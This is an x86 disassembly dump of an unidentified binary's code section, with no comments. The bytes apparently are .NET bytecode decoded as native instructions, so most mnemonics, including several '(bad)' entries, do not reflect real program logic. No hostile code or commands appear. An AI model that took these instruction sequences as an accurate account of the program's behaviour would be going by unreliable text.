  402b12:	00 06                	add    %al,(%esi)
  402b14:	2a be 7e 9f 00 00    	sub    0x9f7e(%esi),%bh
  402b1a:	04 28                	add    $0x28,%al
  402b1c:	44                   	inc    %esp
  402b1d:	01 00                	add    %eax,(%eax)
  402b1f:	06                   	push   %es
  402b20:	2c 15                	sub    $0x15,%al
  402b22:	1f                   	pop    %ds
  402b23:	64 28 46 00          	sub    %al,%fs:0x0(%esi)
  402b27:	00 0a                	add    %cl,(%edx)
  402b29:	28 43 01             	sub    %al,0x1(%ebx)
  402b2c:	00 06                	add    %al,(%esi)
  402b2e:	2c e6                	sub    $0xe6,%al
  402b30:	28 42 01             	sub    %al,0x1(%edx)
  402b33:	00 06                	add    %al,(%esi)
  402b35:	2b df                	sub    %edi,%ebx
  402b37:	28 43 01             	sub    %al,0x1(%ebx)
  402b3a:	00 06                	add    %al,(%esi)
  402b3c:	2d d8 28 52 01       	sub    $0x15228d8,%eax
  402b41:	00 06                	add    %al,(%esi)
  402b43:	2b d1                	sub    %ecx,%edx
  402b45:	7e 73                	jle    0x402bba
  402b47:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402b48:	01 00                	add    %eax,(%eax)
  402b4a:	0a 80 ab 00 00 04    	or     0x40000ab(%eax),%al
  402b50:	73 a5                	jae    0x402af7
  402b52:	01 00                	add    %eax,(%eax)
  402b54:	0a 80 ac 00 00 04    	or     0x40000ac(%eax),%al
  402b5a:	73 a5                	jae    0x402b01
  402b5c:	01 00                	add    %eax,(%eax)
  402b5e:	0a 80 ad 00 00 04    	or     0x40000ad(%eax),%al
  402b64:	2a 32                	sub    (%edx),%dh
  402b66:	02 7b b4             	add    -0x4c(%ebx),%bh
  402b69:	00 00                	add    %al,(%eax)
  402b6b:	04 6f                	add    $0x6f,%al
  402b6d:	be 01 00 0a 2a       	mov    $0x2a0a0001,%esi
  402b72:	96                   	xchg   %eax,%esi
  402b73:	03 16                	add    (%esi),%edx
  402b75:	32 1b                	xor    (%ebx),%bl
  402b77:	03 02                	add    (%edx),%eax
  402b79:	7b b4                	jnp    0x402b2f
  402b7b:	00 00                	add    %al,(%eax)
  402b7d:	04 6f                	add    $0x6f,%al
  402b7f:	be 01 00 0a 2f       	mov    $0x2f0a0001,%esi
  402b84:	0d 02 7b b4 00       	or     $0xb47b02,%eax
  402b89:	00 04 03             	add    %al,(%ebx,%eax,1)
  402b8c:	6f                   	outsl  %ds:(%esi),(%dx)
  402b8d:	bf 01 00 0a 2a       	mov    $0x2a0a0001,%edi
  402b92:	7e bd                	jle    0x402b51
  402b94:	00 00                	add    %al,(%eax)
  402b96:	04 2a                	add    $0x2a,%al
  402b98:	3a 02                	cmp    (%edx),%al
  402b9a:	7b b4                	jnp    0x402b50
  402b9c:	00 00                	add    %al,(%eax)
  402b9e:	04 03                	add    $0x3,%al
  402ba0:	04 6f                	add    $0x6f,%al
  402ba2:	c0 01 00             	rolb   $0x0,(%ecx)
  402ba5:	0a 2a                	or     (%edx),%ch
  402ba7:	4a                   	dec    %edx
  402ba8:	02 28                	add    (%eax),%ch
  402baa:	03 01                	add    (%ecx),%eax
  402bac:	00 0a                	add    %cl,(%edx)
  402bae:	02 73 c1             	add    -0x3f(%ebx),%dh
  402bb1:	01 00                	add    %eax,(%eax)
  402bb3:	0a 7d b4             	or     -0x4c(%ebp),%bh
  402bb6:	00 00                	add    %al,(%eax)
  402bb8:	04 2a                	add    $0x2a,%al
  402bba:	3a 02                	cmp    (%edx),%al
  402bbc:	7b b4                	jnp    0x402b72
  402bbe:	00 00                	add    %al,(%eax)
  402bc0:	04 03                	add    $0x3,%al
  402bc2:	6f                   	outsl  %ds:(%esi),(%dx)
  402bc3:	c2 01 00             	ret    $0x1
  402bc6:	0a 02                	or     (%edx),%al
  402bc8:	2a 4e 0f             	sub    0xf(%esi),%cl
  402bcb:	01 28                	add    %ebp,(%eax)
  402bcd:	86 01                	xchg   %al,(%ecx)
  402bcf:	00 06                	add    %al,(%esi)
  402bd1:	2d 08 02 03 28       	sub    $0x28030208,%eax
  402bd6:	60                   	pusha
  402bd7:	01 00                	add    %eax,(%eax)
  402bd9:	06                   	push   %es
  402bda:	26 02 2a             	add    %es:(%edx),%ch
  402bdd:	3e 02 7b b4          	add    %ds:-0x4c(%ebx),%bh
  402be1:	00 00                	add    %al,(%eax)
  402be3:	04 03                	add    $0x3,%al
  402be5:	04 6f                	add    $0x6f,%al
  402be7:	c3                   	ret
  402be8:	01 00                	add    %eax,(%eax)
  402bea:	0a 02                	or     (%edx),%al
  402bec:	2a 52 0f             	sub    0xf(%edx),%dl
  402bef:	02 28                	add    (%eax),%ch
  402bf1:	86 01                	xchg   %al,(%ecx)
  402bf3:	00 06                	add    %al,(%esi)
  402bf5:	2d 09 02 03 04       	sub    $0x4030209,%eax
  402bfa:	28 62 01             	sub    %ah,0x1(%edx)
  402bfd:	00 06                	add    %al,(%esi)
  402bff:	26 02 2a             	add    %es:(%edx),%ch
  402c02:	3a 02                	cmp    (%edx),%al
  402c04:	7b b4                	jnp    0x402bba
  402c06:	00 00                	add    %al,(%eax)
  402c08:	04 03                	add    $0x3,%al
  402c0a:	6f                   	outsl  %ds:(%esi),(%dx)
  402c0b:	c4 01                	les    (%ecx),%eax
  402c0d:	00 0a                	add    %cl,(%edx)
  402c0f:	02 2a                	add    (%edx),%ch
  402c11:	36 02 7b b4          	add    %ss:-0x4c(%ebx),%bh
  402c15:	00 00                	add    %al,(%eax)
  402c17:	04 6f                	add    $0x6f,%al
  402c19:	c5 01                	lds    (%ecx),%eax
  402c1b:	00 0a                	add    %cl,(%edx)
  402c1d:	02 2a                	add    (%edx),%ch
  402c1f:	36 02 7b b4          	add    %ss:-0x4c(%ebx),%bh
  402c23:	00 00                	add    %al,(%eax)
  402c25:	04 03                	add    $0x3,%al
  402c27:	6f                   	outsl  %ds:(%esi),(%dx)
  402c28:	c6 01 00             	movb   $0x0,(%ecx)
  402c2b:	0a 2a                	or     (%edx),%ch
  402c2d:	36 02 7b b4          	add    %ss:-0x4c(%ebx),%bh
  402c31:	00 00                	add    %al,(%eax)
  402c33:	04 03                	add    $0x3,%al
  402c35:	6f                   	outsl  %ds:(%esi),(%dx)
  402c36:	c7 01 00 0a 2a 32    	movl   $0x322a0a00,(%ecx)
  402c3c:	02 7b b4             	add    -0x4c(%ebx),%bh
  402c3f:	00 00                	add    %al,(%eax)
  402c41:	04 6f                	add    $0x6f,%al
  402c43:	1e                   	push   %ds
  402c44:	00 00                	add    %al,(%eax)
  402c46:	0a 2a                	or     (%edx),%ch
  402c48:	1e                   	push   %ds
  402c49:	02 28                	add    (%eax),%ch
  402c4b:	68 01 00 06 2a       	push   $0x2a060001
  402c50:	22 02                	and    (%edx),%al
  402c52:	16                   	push   %ss
  402c53:	28 6b 01             	sub    %ch,0x1(%ebx)
  402c56:	00 06                	add    %al,(%esi)
  402c58:	2a 36                	sub    (%esi),%dh
  402c5a:	02 28                	add    (%eax),%ch
  402c5c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402c5d:	01 00                	add    %eax,(%eax)
  402c5f:	06                   	push   %es
  402c60:	03 28                	add    (%eax),%ebp
  402c62:	fa                   	cli
  402c63:	01 00                	add    %eax,(%eax)
  402c65:	06                   	push   %es
  402c66:	2a 3a                	sub    (%edx),%bh
  402c68:	02 28                	add    (%eax),%ch
  402c6a:	03 01                	add    (%ecx),%eax
  402c6c:	00 0a                	add    %cl,(%edx)
  402c6e:	02 03                	add    (%ebx),%al
  402c70:	7d b5                	jge    0x402c27
  402c72:	00 00                	add    %al,(%eax)
  402c74:	04 2a                	add    $0x2a,%al
  402c76:	32 02                	xor    (%edx),%al
  402c78:	7b b6                	jnp    0x402c30
  402c7a:	00 00                	add    %al,(%eax)
  402c7c:	04 6f                	add    $0x6f,%al
  402c7e:	c8 01 00 0a          	enter  $0x1,$0xa
  402c82:	2a 3a                	sub    (%edx),%bh
  402c84:	02 7b b6             	add    -0x4a(%ebx),%bh
  402c87:	00 00                	add    %al,(%eax)
  402c89:	04 03                	add    $0x3,%al
  402c8b:	04 6f                	add    $0x6f,%al
  402c8d:	ca 01 00             	lret   $0x1
  402c90:	0a 2a                	or     (%edx),%ch
  402c92:	4a                   	dec    %edx
  402c93:	02 28                	add    (%eax),%ch
  402c95:	03 01                	add    (%ecx),%eax
  402c97:	00 0a                	add    %cl,(%edx)
  402c99:	02 73 cb             	add    -0x35(%ebx),%dh
  402c9c:	01 00                	add    %eax,(%eax)
  402c9e:	0a 7d b6             	or     -0x4a(%ebp),%bh
  402ca1:	00 00                	add    %al,(%eax)
  402ca3:	04 2a                	add    $0x2a,%al
  402ca5:	36 02 03             	add    %ss:(%ebx),%al
  402ca8:	7e bd                	jle    0x402c67
  402caa:	00 00                	add    %al,(%eax)
  402cac:	04 28                	add    $0x28,%al
  402cae:	73 01                	jae    0x402cb1
  402cb0:	00 06                	add    %al,(%esi)
  402cb2:	2a 3e                	sub    (%esi),%bh
  402cb4:	02 7b b6             	add    -0x4a(%ebx),%bh
  402cb7:	00 00                	add    %al,(%eax)
  402cb9:	04 03                	add    $0x3,%al
  402cbb:	04 6f                	add    $0x6f,%al
  402cbd:	cc                   	int3
  402cbe:	01 00                	add    %eax,(%eax)
  402cc0:	0a 02                	or     (%edx),%al
  402cc2:	2a 52 0f             	sub    0xf(%edx),%dl
  402cc5:	02 28                	add    (%eax),%ch
  402cc7:	86 01                	xchg   %al,(%ecx)
  402cc9:	00 06                	add    %al,(%esi)
  402ccb:	2d 09 02 03 04       	sub    $0x4030209,%eax
  402cd0:	28 73 01             	sub    %dh,0x1(%ebx)
  402cd3:	00 06                	add    %al,(%esi)
  402cd5:	26 02 2a             	add    %es:(%edx),%ch
  402cd8:	36 02 7b b6          	add    %ss:-0x4a(%ebx),%bh
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	04 03                	add    $0x3,%al
  402ce0:	6f                   	outsl  %ds:(%esi),(%dx)
  402ce1:	cd 01                	int    $0x1
  402ce3:	00 0a                	add    %cl,(%edx)
  402ce5:	2a 36                	sub    (%esi),%dh
  402ce7:	02 7b b6             	add    -0x4a(%ebx),%bh
  402cea:	00 00                	add    %al,(%eax)
  402cec:	04 6f                	add    $0x6f,%al
  402cee:	ce                   	into
  402cef:	01 00                	add    %eax,(%eax)
  402cf1:	0a 02                	or     (%edx),%al
  402cf3:	2a 36                	sub    (%esi),%dh
  402cf5:	02 7b b6             	add    -0x4a(%ebx),%bh
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	04 03                	add    $0x3,%al
  402cfc:	6f                   	outsl  %ds:(%esi),(%dx)
  402cfd:	cf                   	iret
  402cfe:	01 00                	add    %eax,(%eax)
  402d00:	0a 2a                	or     (%edx),%ch
  402d02:	3a 02                	cmp    (%edx),%al
  402d04:	7b b6                	jnp    0x402cbc
  402d06:	00 00                	add    %al,(%eax)
  402d08:	04 03                	add    $0x3,%al
  402d0a:	04 6f                	add    $0x6f,%al
  402d0c:	c9                   	leave
  402d0d:	01 00                	add    %eax,(%eax)
  402d0f:	0a 2a                	or     (%edx),%ch
  402d11:	4a                   	dec    %edx
  402d12:	02 7b b6             	add    -0x4a(%ebx),%bh
  402d15:	00 00                	add    %al,(%eax)
  402d17:	04 6f                	add    $0x6f,%al
  402d19:	d0 01                	rolb   $1,(%ecx)
  402d1b:	00 0a                	add    %cl,(%edx)
  402d1d:	03 6f c6             	add    -0x3a(%edi),%ebp
  402d20:	01 00                	add    %eax,(%eax)
  402d22:	0a 2a                	or     (%edx),%ch
  402d24:	32 02                	xor    (%edx),%al
  402d26:	7b b6                	jnp    0x402cde
  402d28:	00 00                	add    %al,(%eax)
  402d2a:	04 6f                	add    $0x6f,%al
  402d2c:	1f                   	pop    %ds
  402d2d:	00 00                	add    %al,(%eax)
  402d2f:	0a 2a                	or     (%edx),%ch
  402d31:	46                   	inc    %esi
  402d32:	02 7b b6             	add    -0x4a(%ebx),%bh
  402d35:	00 00                	add    %al,(%eax)
  402d37:	04 6f                	add    $0x6f,%al
  402d39:	d0 01                	rolb   $1,(%ecx)
  402d3b:	00 0a                	add    %cl,(%edx)
  402d3d:	6f                   	outsl  %ds:(%esi),(%dx)
  402d3e:	1e                   	push   %ds
  402d3f:	00 00                	add    %al,(%eax)
  402d41:	0a 2a                	or     (%edx),%ch
  402d43:	1e                   	push   %ds
  402d44:	02 28                	add    (%eax),%ch
  402d46:	7b 01                	jnp    0x402d49
  402d48:	00 06                	add    %al,(%esi)
  402d4a:	2a 22                	sub    (%edx),%ah
  402d4c:	02 16                	add    (%esi),%dl
  402d4e:	28 7f 01             	sub    %bh,0x1(%edi)
  402d51:	00 06                	add    %al,(%esi)
  402d53:	2a 36                	sub    (%esi),%dh
  402d55:	02 28                	add    (%eax),%ch
  402d57:	a3 01 00 06 03       	mov    %eax,0x3060001
  402d5c:	28 fa                	sub    %bh,%dl
  402d5e:	01 00                	add    %eax,(%eax)
  402d60:	06                   	push   %es
  402d61:	2a 3a                	sub    (%edx),%bh
  402d63:	02 28                	add    (%eax),%ch
  402d65:	03 01                	add    (%ecx),%eax
  402d67:	00 0a                	add    %cl,(%edx)
  402d69:	02 03                	add    (%ebx),%al
  402d6b:	7d b7                	jge    0x402d24
  402d6d:	00 00                	add    %al,(%eax)
  402d6f:	04 2a                	add    $0x2a,%al
  402d71:	32 02                	xor    (%edx),%al
  402d73:	7c b9                	jl     0x402d2e
  402d75:	00 00                	add    %al,(%eax)
  402d77:	04 28                	add    $0x28,%al
  402d79:	85 01                	test   %eax,(%ecx)
  402d7b:	00 06                	add    %al,(%esi)
  402d7d:	2a fa                	sub    %dl,%bh
  402d7f:	02 7c b9 00          	add    0x0(%ecx,%edi,4),%bh
  402d83:	00 04 28             	add    %al,(%eax,%ebp,1)
  402d86:	8b 01                	mov    (%ecx),%eax
  402d88:	00 06                	add    %al,(%esi)
  402d8a:	2c 0c                	sub    $0xc,%al
  402d8c:	02 7b b9             	add    -0x47(%ebx),%bh
  402d8f:	00 00                	add    %al,(%eax)
  402d91:	04 28                	add    $0x28,%al
  402d93:	ad                   	lods   %ds:(%esi),%eax
  402d94:	01 00                	add    %eax,(%eax)
  402d96:	06                   	push   %es
  402d97:	2a 02                	sub    (%edx),%al
  402d99:	7c b9                	jl     0x402d54
  402d9b:	00 00                	add    %al,(%eax)
  402d9d:	04 28                	add    $0x28,%al
  402d9f:	8c 01                	mov    %es,(%ecx)
  402da1:	00 06                	add    %al,(%esi)
  402da3:	2c 0c                	sub    $0xc,%al
  402da5:	02 7b b9             	add    -0x47(%ebx),%bh
  402da8:	00 00                	add    %al,(%eax)
  402daa:	04 28                	add    $0x28,%al
  402dac:	ae                   	scas   %es:(%edi),%al
  402dad:	01 00                	add    %eax,(%eax)
  402daf:	06                   	push   %es
  402db0:	2a 02                	sub    (%edx),%al
  402db2:	7b b9                	jnp    0x402d6d
  402db4:	00 00                	add    %al,(%eax)
  402db6:	04 8c                	add    $0x8c,%al
  402db8:	2c 00                	sub    $0x0,%al
  402dba:	00 02                	add    %al,(%edx)
  402dbc:	2a 56 02             	sub    0x2(%esi),%dl
  402dbf:	28 03                	sub    %al,(%ebx)
  402dc1:	01 00                	add    %eax,(%eax)
  402dc3:	0a 02                	or     (%edx),%al
  402dc5:	03 7d b8             	add    -0x48(%ebp),%edi
  402dc8:	00 00                	add    %al,(%eax)
  402dca:	04 02                	add    $0x2,%al
  402dcc:	04 7d                	add    $0x7d,%al
  402dce:	b9 00 00 04 2a       	mov    $0x2a040000,%ecx
  402dd3:	1e                   	push   %ds
  402dd4:	02 7b ba             	add    -0x46(%ebx),%bh
  402dd7:	00 00                	add    %al,(%eax)
  402dd9:	04 2a                	add    $0x2a,%al
  402ddb:	2a 02                	sub    (%edx),%al
  402ddd:	28 85 01 00 06 16    	sub    %al,0x16060001(%ebp)
  402de3:	fe 01                	incb   (%ecx)
  402de5:	2a 2a                	sub    (%edx),%ch
  402de7:	02 28                	add    (%eax),%ch
  402de9:	85 01                	test   %eax,(%ecx)
  402deb:	00 06                	add    %al,(%esi)
  402ded:	17                   	pop    %ss
  402dee:	fe 01                	incb   (%ecx)
  402df0:	2a 2a                	sub    (%edx),%ch
  402df2:	02 28                	add    (%eax),%ch
  402df4:	85 01                	test   %eax,(%ecx)
  402df6:	00 06                	add    %al,(%esi)
  402df8:	18 fe                	sbb    %bh,%dh
  402dfa:	01 2a                	add    %ebp,(%edx)
  402dfc:	2a 02                	sub    (%edx),%al
  402dfe:	28 85 01 00 06 19    	sub    %al,0x19060001(%ebp)
  402e04:	fe 01                	incb   (%ecx)
  402e06:	2a 2a                	sub    (%edx),%ch
  402e08:	02 28                	add    (%eax),%ch
  402e0a:	85 01                	test   %eax,(%ecx)
  402e0c:	00 06                	add    %al,(%esi)
  402e0e:	1a fe                	sbb    %dh,%bh
  402e10:	01 2a                	add    %ebp,(%edx)
  402e12:	2a 02                	sub    (%edx),%al
  402e14:	28 85 01 00 06 1b    	sub    %al,0x1b060001(%ebp)
  402e1a:	fe 01                	incb   (%ecx)
  402e1c:	2a 5a 02             	sub    0x2(%edx),%bl
  402e1f:	28 8b 01 00 06 2d    	sub    %cl,0x2d060001(%ebx)
  402e25:	02 14 2a             	add    (%edx,%ebp,1),%dl
  402e28:	02 7b bb             	add    -0x45(%ebx),%bh
  402e2b:	00 00                	add    %al,(%eax)
  402e2d:	04 74                	add    $0x74,%al
  402e2f:	29 00                	sub    %eax,(%eax)
  402e31:	00 02                	add    %al,(%edx)
  402e33:	2a 5a 02             	sub    0x2(%edx),%bl
  402e36:	28 8c 01 00 06 2d 02 	sub    %cl,0x22d0600(%ecx,%eax,1)
  402e3d:	14 2a                	adc    $0x2a,%al
  402e3f:	02 7b bb             	add    -0x45(%ebx),%bh
  402e42:	00 00                	add    %al,(%eax)
  402e44:	04 74                	add    $0x74,%al
  402e46:	27                   	daa
  402e47:	00 00                	add    %al,(%eax)
  402e49:	02 2a                	add    (%edx),%ch
  402e4b:	96                   	xchg   %eax,%esi
  402e4c:	02 28                	add    (%eax),%ch
  402e4e:	8b 01                	mov    (%ecx),%eax
  402e50:	00 06                	add    %al,(%esi)
  402e52:	2c 12                	sub    $0x12,%al
  402e54:	02 7b bb             	add    -0x45(%ebx),%bh
  402e57:	00 00                	add    %al,(%eax)
  402e59:	04 74                	add    $0x74,%al
  402e5b:	29 00                	sub    %eax,(%eax)
  402e5d:	00 02                	add    %al,(%edx)
  402e5f:	03 6f 6f             	add    0x6f(%edi),%ebp
  402e62:	01 00                	add    %eax,(%eax)
  402e64:	06                   	push   %es
  402e65:	2a 72 81             	sub    -0x7f(%edx),%dh
  402e68:	19 00                	sbb    %eax,(%eax)
  402e6a:	70 73                	jo     0x402edf
  402e6c:	d8 01                	fadds  (%ecx)
  402e6e:	00 0a                	add    %cl,(%edx)
  402e70:	7a 9a                	jp     0x402e0c
  402e72:	02 28                	add    (%eax),%ch
  402e74:	8b 01                	mov    (%ecx),%eax
  402e76:	00 06                	add    %al,(%esi)
  402e78:	2c 13                	sub    $0x13,%al
  402e7a:	02 7b bb             	add    -0x45(%ebx),%bh
  402e7d:	00 00                	add    %al,(%eax)
  402e7f:	04 74                	add    $0x74,%al
  402e81:	29 00                	sub    %eax,(%eax)
  402e83:	00 02                	add    %al,(%edx)
  402e85:	03 04 6f             	add    (%edi,%ebp,2),%eax
  402e88:	70 01                	jo     0x402e8b
  402e8a:	00 06                	add    %al,(%esi)
  402e8c:	2a 72 81             	sub    -0x7f(%edx),%dh
  402e8f:	19 00                	sbb    %eax,(%eax)
  402e91:	70 73                	jo     0x402f06
  402e93:	d8 01                	fadds  (%ecx)
  402e95:	00 0a                	add    %cl,(%edx)
  402e97:	7a 96                	jp     0x402e2f
  402e99:	02 28                	add    (%eax),%ch
  402e9b:	8c 01                	mov    %es,(%ecx)
  402e9d:	00 06                	add    %al,(%esi)
  402e9f:	2c 12                	sub    $0x12,%al
  402ea1:	02 7b bb             	add    -0x45(%ebx),%bh
  402ea4:	00 00                	add    %al,(%eax)
  402ea6:	04 74                	add    $0x74,%al
  402ea8:	27                   	daa
  402ea9:	00 00                	add    %al,(%eax)
  402eab:	02 03                	add    (%ebx),%al
  402ead:	6f                   	outsl  %ds:(%esi),(%dx)
  402eae:	5c                   	pop    %esp
  402eaf:	01 00                	add    %eax,(%eax)
  402eb1:	06                   	push   %es
  402eb2:	2a 72 d9             	sub    -0x27(%edx),%dh
  402eb5:	19 00                	sbb    %eax,(%eax)
  402eb7:	70 73                	jo     0x402f2c
  402eb9:	d8 01                	fadds  (%ecx)
  402ebb:	00 0a                	add    %cl,(%edx)
  402ebd:	7a 9a                	jp     0x402e59
  402ebf:	02 28                	add    (%eax),%ch
  402ec1:	8c 01                	mov    %es,(%ecx)
  402ec3:	00 06                	add    %al,(%esi)
  402ec5:	2c 13                	sub    $0x13,%al
  402ec7:	02 7b bb             	add    -0x45(%ebx),%bh
  402eca:	00 00                	add    %al,(%eax)
  402ecc:	04 74                	add    $0x74,%al
  402ece:	27                   	daa
  402ecf:	00 00                	add    %al,(%eax)
  402ed1:	02 03                	add    (%ebx),%al
  402ed3:	04 6f                	add    $0x6f,%al
  402ed5:	5d                   	pop    %ebp
  402ed6:	01 00                	add    %eax,(%eax)
  402ed8:	06                   	push   %es
  402ed9:	2a 72 d9             	sub    -0x27(%edx),%dh
  402edc:	19 00                	sbb    %eax,(%eax)
  402ede:	70 73                	jo     0x402f53
  402ee0:	d8 01                	fadds  (%ecx)
  402ee2:	00 0a                	add    %cl,(%edx)
  402ee4:	7a 5a                	jp     0x402f40
  402ee6:	02 03                	add    (%ebx),%al
  402ee8:	7d ba                	jge    0x402ea4
  402eea:	00 00                	add    %al,(%eax)
  402eec:	04 02                	add    $0x2,%al
  402eee:	04 7d                	add    $0x7d,%al
  402ef0:	bc 00 00 04 02       	mov    $0x2040000,%esp
  402ef5:	05 7d bb 00 00       	add    $0xbb7d,%eax
  402efa:	04 2a                	add    $0x2a,%al
  402efc:	e2 0f                	loop   0x402f0d
  402efe:	01 28                	add    %ebp,(%eax)
  402f00:	d9 01                	flds   (%ecx)
  402f02:	00 0a                	add    %cl,(%edx)
  402f04:	2c 23                	sub    $0x23,%al
  402f06:	02 14 7d bb 00 00 04 	add    0x40000bb(,%edi,2),%dl
  402f0d:	02 17                	add    (%edi),%dl
  402f0f:	7d ba                	jge    0x402ecb
  402f11:	00 00                	add    %al,(%eax)
  402f13:	04 02                	add    $0x2,%al
  402f15:	0f 01                	(bad)
  402f17:	28 da                	sub    %bl,%dl
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	0a 2d 03 16 2b 01    	or     0x12b1603,%ch
  402f21:	17                   	pop    %ss
  402f22:	6c                   	insb   (%dx),%es:(%edi)
  402f23:	7d bc                	jge    0x402ee1
  402f25:	00 00                	add    %al,(%eax)
  402f27:	04 2a                	add    $0x2a,%al
  402f29:	02 7e bd             	add    -0x43(%esi),%bh
  402f2c:	00 00                	add    %al,(%eax)
  402f2e:	04 81                	add    $0x81,%al
  402f30:	2c 00                	sub    $0x0,%al
  402f32:	00 02                	add    %al,(%edx)
  402f34:	2a c6                	sub    %dh,%al
  402f36:	0f 01                	(bad)
  402f38:	28 db                	sub    %bl,%bl
  402f3a:	01 00                	add    %eax,(%eax)
  402f3c:	0a 2c 1c             	or     (%esp,%ebx,1),%ch
  402f3f:	02 14 7d bb 00 00 04 	add    0x40000bb(,%edi,2),%dl
  402f46:	02 18                	add    (%eax),%bl
  402f48:	7d ba                	jge    0x402f04
  402f4a:	00 00                	add    %al,(%eax)
  402f4c:	04 02                	add    $0x2,%al
  402f4e:	0f 01                	(bad)
  402f50:	28 dc                	sub    %bl,%ah
  402f52:	01 00                	add    %eax,(%eax)
  402f54:	0a 7d bc             	or     -0x44(%ebp),%bh
  402f57:	00 00                	add    %al,(%eax)
  402f59:	04 2a                	add    $0x2a,%al
  402f5b:	02 7e bd             	add    -0x43(%esi),%bh
  402f5e:	00 00                	add    %al,(%eax)
  402f60:	04 81                	add    $0x81,%al
  402f62:	2c 00                	sub    $0x0,%al
  402f64:	00 02                	add    %al,(%edx)
  402f66:	2a b6 03 2c 1e 02    	sub    0x21e2c03(%esi),%dh
  402f6c:	23 00                	and    (%eax),%eax
  402f6e:	00 00                	add    %al,(%eax)
  402f70:	00 00                	add    %al,(%eax)
  402f72:	00 00                	add    %al,(%eax)
  402f74:	00 7d bc             	add    %bh,-0x44(%ebp)
  402f77:	00 00                	add    %al,(%eax)
  402f79:	04 02                	add    $0x2,%al
  402f7b:	19 7d ba             	sbb    %edi,-0x46(%ebp)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	04 02                	add    $0x2,%al
  402f82:	03 7d bb             	add    -0x45(%ebp),%edi
  402f85:	00 00                	add    %al,(%eax)
  402f87:	04 2a                	add    $0x2a,%al
  402f89:	02 7e bd             	add    -0x43(%esi),%bh
  402f8c:	00 00                	add    %al,(%eax)
  402f8e:	04 81                	add    $0x81,%al
  402f90:	2c 00                	sub    $0x0,%al
  402f92:	00 02                	add    %al,(%edx)
  402f94:	2a b6 03 2c 1e 02    	sub    0x21e2c03(%esi),%dh
  402f9a:	23 00                	and    (%eax),%eax
  402f9c:	00 00                	add    %al,(%eax)
  402f9e:	00 00                	add    %al,(%eax)
  402fa0:	00 00                	add    %al,(%eax)
  402fa2:	00 7d bc             	add    %bh,-0x44(%ebp)
  402fa5:	00 00                	add    %al,(%eax)
  402fa7:	04 02                	add    $0x2,%al
  402fa9:	1a 7d ba             	sbb    -0x46(%ebp),%bh
  402fac:	00 00                	add    %al,(%eax)
  402fae:	04 02                	add    $0x2,%al
  402fb0:	03 7d bb             	add    -0x45(%ebp),%edi
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	04 2a                	add    $0x2a,%al
  402fb7:	02 7e bd             	add    -0x43(%esi),%bh
  402fba:	00 00                	add    %al,(%eax)
  402fbc:	04 81                	add    $0x81,%al
  402fbe:	2c 00                	sub    $0x0,%al
  402fc0:	00 02                	add    %al,(%edx)
  402fc2:	2a b6 03 2c 1e 02    	sub    0x21e2c03(%esi),%dh
  402fc8:	23 00                	and    (%eax),%eax
  402fca:	00 00                	add    %al,(%eax)
  402fcc:	00 00                	add    %al,(%eax)
  402fce:	00 00                	add    %al,(%eax)
  402fd0:	00 7d bc             	add    %bh,-0x44(%ebp)
  402fd3:	00 00                	add    %al,(%eax)
  402fd5:	04 02                	add    $0x2,%al
  402fd7:	1b 7d ba             	sbb    -0x46(%ebp),%edi
  402fda:	00 00                	add    %al,(%eax)
  402fdc:	04 02                	add    $0x2,%al
  402fde:	03 7d bb             	add    -0x45(%ebp),%edi
  402fe1:	00 00                	add    %al,(%eax)
  402fe3:	04 2a                	add    $0x2a,%al
  402fe5:	02 7e bd             	add    -0x43(%esi),%bh
  402fe8:	00 00                	add    %al,(%eax)
  402fea:	04 81                	add    $0x81,%al
  402fec:	2c 00                	sub    $0x0,%al
  402fee:	00 02                	add    %al,(%edx)
  402ff0:	2a 1e                	sub    (%esi),%bl
  402ff2:	02 73 9b             	add    -0x65(%ebx),%dh
  402ff5:	01 00                	add    %eax,(%eax)
  402ff7:	06                   	push   %es
  402ff8:	2a 1e                	sub    (%esi),%bl
  402ffa:	02 73 9c             	add    -0x64(%ebx),%dh
  402ffd:	01 00                	add    %eax,(%eax)
  402fff:	06                   	push   %es
  403000:	2a 1e                	sub    (%esi),%bl
  403002:	02 73 9d             	add    -0x63(%ebx),%dh
  403005:	01 00                	add    %eax,(%eax)
  403007:	06                   	push   %es
  403008:	2a 1e                	sub    (%esi),%bl
  40300a:	02 73 9e             	add    -0x62(%ebx),%dh
  40300d:	01 00                	add    %eax,(%eax)
  40300f:	06                   	push   %es
  403010:	2a 1e                	sub    (%esi),%bl
  403012:	02 73 9f             	add    -0x61(%ebx),%dh
  403015:	01 00                	add    %eax,(%eax)
  403017:	06                   	push   %es
  403018:	2a 4e 0f             	sub    0xf(%esi),%cl
  40301b:	00 28                	add    %ch,(%eax)
  40301d:	88 01                	mov    %al,(%ecx)
  40301f:	00 06                	add    %al,(%esi)
  403021:	2c 08                	sub    $0x8,%al
  403023:	0f 00 28             	verw   (%eax)
  403026:	8f 01                	pop    (%ecx)
  403028:	00 06                	add    %al,(%esi)
  40302a:	2a 16                	sub    (%esi),%dl
  40302c:	2a 76 0f             	sub    0xf(%esi),%dh
  40302f:	00 28                	add    %ch,(%eax)
  403031:	87 01                	xchg   %eax,(%ecx)
  403033:	00 06                	add    %al,(%esi)
  403035:	2c 12                	sub    $0x12,%al
  403037:	02 7b bc             	add    -0x44(%ebx),%bh
  40303a:	00 00                	add    %al,(%eax)
  40303c:	04 23                	add    $0x23,%al
  40303e:	00 00                	add    %al,(%eax)
  403040:	00 00                	add    %al,(%eax)
  403042:	00 00                	add    %al,(%eax)
  403044:	f0 3f                	lock aas
  403046:	fe 01                	incb   (%ecx)
  403048:	2a 16                	sub    (%esi),%dl
  40304a:	2a 6a 0f             	sub    0xf(%edx),%ch
  40304d:	00 28                	add    %ch,(%eax)
  40304f:	89 01                	mov    %eax,(%ecx)
  403051:	00 06                	add    %al,(%esi)
  403053:	2c 07                	sub    $0x7,%al
  403055:	02 7b bc             	add    -0x44(%ebx),%bh
  403058:	00 00                	add    %al,(%eax)
  40305a:	04 2a                	add    $0x2a,%al
  40305c:	23 00                	and    (%eax),%eax
  40305e:	00 00                	add    %al,(%eax)
  403060:	00 00                	add    %al,(%eax)
  403062:	00 f8                	add    %bh,%al
  403064:	ff 2a                	ljmp   *(%edx)
  403066:	82 0f 00             	orb    $0x0,(%edi)
  403069:	28 8a 01 00 06 2d    	sub    %cl,0x2d060001(%edx)
